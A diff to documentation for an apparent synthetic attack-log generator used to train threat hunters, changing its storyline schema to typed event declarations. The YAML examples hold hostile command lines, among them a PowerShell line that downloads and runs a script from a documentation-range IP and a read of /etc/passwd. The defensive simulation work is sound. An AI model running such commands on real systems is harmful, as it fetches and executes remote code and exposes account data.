@@ -218,11 +218,12 @@ storyline:                        # The attack events to bury in the data
   - time: "+2h"                   # Relative offset from start, or absolute ISO 8601
     actor: marcus.chen            # Username of compromised account (or system account)
     system: WS-DEV-01             # Must reference existing hostname
-    activity: "Description of what happens"
-    details:                      # Flexible dict — activity-specific fields
-      source_ip: "203.0.113.50"
-      command_line: "whoami"
-      technique: "T1033 - System Owner/User Discovery"
+    activity: "Recon: enumerate current user"  # Human-readable (for GROUND_TRUTH.md only)
+    events:                       # Typed event declarations — validated per-type fields
+      - type: process
+        process_name: "C:\\Windows\\System32\\whoami.exe"
+        command_line: "whoami"
+        technique: "T1033 - System Owner/User Discovery"
 
 output:
   logs:
@@ -272,39 +273,56 @@ The storyline is the most important part — it's what the threat hunter will be
 
 Not every scenario needs all phases — an insider threat won't have privilege escalation if they already have access, a ransomware attack emphasizes impact over exfiltration. But actively consider each phase and include it when it makes the attack realistic. Omitting privilege escalation or persistence from an external attacker scenario is a common gap that makes the storyline feel incomplete.
 
-When building storyline events, be technically specific because the engine uses these details directly:
+When building storyline events, each entry needs an `events` list with typed declarations. Be technically specific — the engine uses these fields directly.
 
-**For process execution events:**
+**Available event types:** `process`, `logon`, `failed_logon`, `logoff`, `connection`, `ssh_session`, `rdp_session`, `account_created`, `account_deleted`, `group_member_added`, `service_installed`, `scheduled_task_created`, `log_cleared`, `create_remote_thread`
+
+**Process execution:**
 ```yaml
-details:
-  process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-  command_line: "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/payload.ps1')\""
-  technique: "T1059.001 - PowerShell"
+events:
+  - type: process
+    process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    command_line: "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/payload.ps1')\""
+    technique: "T1059.001 - PowerShell"
 ```
 
-**For network connections:**
+**Network connections (C2, exfiltration):**
 ```yaml
-details:
-  dst_ip: "198.51.100.10"
-  dst_port: 443
-  service: "https"
-  technique: "T1071.001 - Web Protocols"
+events:
+  - type: connection
+    dst_ip: "198.51.100.10"
+    dst_port: 443
+    service: "ssl"
+    technique: "T1071.001 - Web Protocols"
 ```
 
-**For authentication events:**
+**Authentication (logon/failed logon):**
 ```yaml
-details:
-  source_ip: "10.0.1.50"
-  logon_type: 3    # 3=network, 10=RDP, 2=interactive
-  technique: "T1078 - Valid Accounts"
+events:
+  - type: logon
+    source_ip: "10.0.1.50"
+    logon_type: 3    # 3=network, 10=RDP, 2=interactive
+    technique: "T1078 - Valid Accounts"
 ```
 
-**For Linux commands:**
+**SSH/RDP lateral movement (compound events — produces network + host logs):**
 ```yaml
-details:
-  command: "cat /etc/passwd"
-  technique: "T1087.001 - Account Discovery: Local Account"
+events:
+  - type: ssh_session   # or rdp_session
+    source_ip: "10.0.1.50"
+    technique: "T1021.004 - Remote Services: SSH"
 ```
+
+**Linux commands (use process type with Linux binary paths):**
+```yaml
+events:
+  - type: process
+    process_name: "/usr/bin/cat"
+    command_line: "cat /etc/passwd"
+    technique: "T1087.001 - Account Discovery: Local Account"
+```
+
+**Supplementary inference:** Process events with `supplementary: auto` (default) auto-generate Windows audit events (4720, 4697, 4698, 1102) from command-line patterns. You don't need to declare these explicitly unless you need specific field values. If the same type is already in your `events` list, inference skips it.
 
 Use RFC 5737 documentation IP ranges for external attacker IPs (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24). Use private ranges (10.x, 172.16-31.x, 192.168.x) for internal systems.
 
